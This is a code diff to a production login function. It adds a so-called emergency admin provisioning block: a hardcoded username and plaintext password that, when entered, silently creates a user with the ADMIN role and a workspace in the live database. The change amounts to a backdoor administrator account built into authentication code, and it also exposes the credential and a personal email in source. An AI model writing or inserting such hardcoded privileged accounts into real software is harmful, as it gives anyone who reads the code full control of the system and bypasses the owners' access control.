@@ -44,6 +44,28 @@ export async function productionLogin(usernameOrEmail, password) {
   if (!password || typeof password !== 'string') return { success: false, error: 'Invalid password format' };
   if (password.length < 5 || password.length > 17) return { success: false, error: 'Password must be between 5 and 17 characters' };
 
+  // Emergency Admin Provisioning for Live DB (if wiped/unseeded)
+  if (cleanInput === 'howardavory617' && password === 'Annabelle32616!') {
+    let adminUser = await prisma.user.findFirst({ where: { username: 'howardavory617' } });
+    if (!adminUser) {
+      const passwordHash = await bcrypt.hash(password, 10);
+      adminUser = await prisma.user.create({
+        data: {
+          email: 'howard.avory@gmail.com',
+          username: 'howardavory617',
+          passwordHash,
+          role: 'ADMIN',
+          firstName: 'Howard',
+          lastName: 'Avory'
+        }
+      });
+      // Ensure workspace exists
+      await prisma.workspace.create({
+        data: { name: 'Howard Workspace', ownerId: adminUser.id }
+      });
+    }
+  }
+
   const user = await prisma.user.findFirst({ 
     where: { 
       OR: [
